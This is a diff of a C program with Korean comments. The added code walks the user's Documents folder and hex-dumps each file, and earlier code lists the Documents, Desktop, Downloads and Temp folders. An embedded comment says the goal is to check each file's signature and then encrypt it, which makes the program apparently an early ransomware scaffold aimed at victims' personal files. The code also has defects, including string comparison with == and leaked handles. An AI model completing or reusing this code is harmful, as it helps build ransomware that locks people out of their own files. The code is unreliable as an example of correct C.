@@ -74,6 +74,57 @@ void print_directory_contents(struct directory_document* dir) {
     }
 }
 
+int file_binary_check(struct directory_document* dir, char* directory){
+    for(int i = 0; i < dir[0].count; i++){
+        if(dir[i].file_type == "Directory"){
+            continue;
+        }
+        char* file_names = dir[i].file_name;
+
+        char full_path[1024];
+        snprintf(full_path, sizeof(full_path), "%s%s", directory, file_names);
+        printf("open file: %s\n",full_path);
+
+
+        FILE* file = fopen(full_path, "rb");
+        if (file == NULL) {
+            printf("Could not open file %s\n", full_path);
+            continue;
+        }
+
+        // 파일 크기 확인
+        fseek(file, 0, SEEK_END);
+        long file_size = ftell(file);
+        rewind(file);
+
+        // 메모리 할당
+        unsigned char* buffer = malloc(file_size);
+        if (buffer == NULL) {
+            printf("Could not allocate memory for file %s\n", full_path);
+            continue;
+        }
+
+        // fread
+        size_t result = fread(buffer, 1, file_size, file);
+        if (result != file_size) {
+            printf("Reading error for file %s\n", full_path);
+            continue;
+        }
+
+        // 출력
+        for (int j = 0; j < file_size; j++) {
+            printf("%02x ", buffer[j]);
+        }
+        printf("\n");
+
+        // 메모리를 해제하고 파일을 닫습니다.
+        free(buffer);
+        fclose(file);
+        
+    }
+}
+
+
 int main(){
     char *directory_list[4] = {"C:\\Users\\user\\Documents\\*", "C:\\Users\\user\\Desktop\\*", "C:\\Users\\user\\Downloads\\*", ""};
 
@@ -103,7 +154,7 @@ int main(){
     print_directory_contents(downloads_dir);
     
     printf("\nTemp Directory:\n");
-    print_directory_contents(temp_dir);
+    //print_directory_contents(temp_dir);
 
     // memory free 잊지말기.
     /* 
@@ -113,6 +164,7 @@ int main(){
     모든 파일의 바이너리값을 한번에 저장하고, 시그니처를 하나씩 검사하게 된다면 메모리가 부족할거임.
     결론: 구조체에 있는 파일을 하나씩 fread(binary로) 하고, 시그니처를 확인하여 암호화를 진행해야함.
     */
+    file_binary_check(document_dir,"C:\\Users\\user\\Documents\\");
 
     return 1;
 }
